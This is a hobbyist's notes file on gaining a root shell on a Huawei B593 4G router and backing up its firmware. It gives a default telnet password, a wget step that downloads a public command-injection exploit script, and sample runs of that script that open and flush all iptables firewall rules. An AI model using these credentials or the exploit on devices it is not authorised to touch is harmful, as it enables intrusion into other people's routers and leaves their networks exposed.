# Huawei 593 - Tele2


telnet 192.168.1.1
# if telnet says connection refused keep trying every few seconds, it'll work
# if telnet just hangs and timeouts then port is not open and no point retrying with telnet
# login: admin
# pass: HW4GCPE
# type "shell" or "sh" to open root shell


# Download B593cmd.pl:

    wget http://opensource.hqcodeshop.com/Huawei%20B593/exploit/B593cmd.pl
    chmod +x B593cmd.pl
   
### Execute commands with

    ./B593cmd.pl <ip> <admin_pw> "command_to_execute


### Allow incoming connections
    ./B593cmd.pl 192.168.1.3 odemnn  "iptables -I INPUT -i br0 -j ACCEPT"


### SSH 
    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc admin@192.168.1.3 -s /bin/sh


### Clear all iptables

    ./B593cmd.pl 192.168.1.1 admin "iptables -nL INPUT"
    ./B593cmd.pl 192.168.1.3 odemnn "iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -F;iptables -X


### Login 

    telnet 192.168.1.3


### ENable serial console    

Enable CFE and normal boot (B593.trx) serial console

    nvram set console_disable=0

# Enable boot_wait with 10 second delay for more recovery options

    nvram set boot_wait=on
    nvram set wait_time=10

# Boot regular OS (B593.trx). Use boot_part=1 for recovery OS (B593-small.trx)
    nvram set boot_part=0

# Write changes made to NVRAM
    nvram commit

![Screenshot](pics/backup-script_tele2.gif)

Run script in scripts/backup-script.sh for backup as above

### Backup MTD Partitions:

for mtd_partitions in mtd0 mtd1 mtd2 mtd3 mtd4 mtd5 mtd6; do 
dd if=/dev/$mtd_partitions of=/mnt/usb1_1/huawei_b593_backup/mtd_partitions/$mtd_partitions.bin; done

### Backup mtdblock Partitions:
for mtdblock0_partitions in mtdblock0 mtdblock1 mtdblock2 mtdblock3 mtdblock4 mtdblock5 mtdblock6; do 
dd if=/dev/$mtdblock0_partitions of=/mnt/usb1_1/huawei_b593_backup/mtdblock0_partitions/$mtdblock0_partitions.bin; done


References

http://opensource.hqcodeshop.com/Huawei%20B593/exploit/B593cmd.pl

https://blog.hqcodeshop.fi/archives/130-Exploit-Running-commands-on-B593-shell.html


http://blog.asiantuntijakaveri.fi/search/label/b593

http://blog.asiantuntijakaveri.fi/2013/08/gaining-root-shell-on-huawei-b593-4g.html

http://blog.asiantuntijakaveri.fi/2014/08/persistent-customizations-to-huawei.html

https://dlcdnets.asus.com/pub/ASUS/wireless/RT-N53/FW_RT_N53_30043763754.zip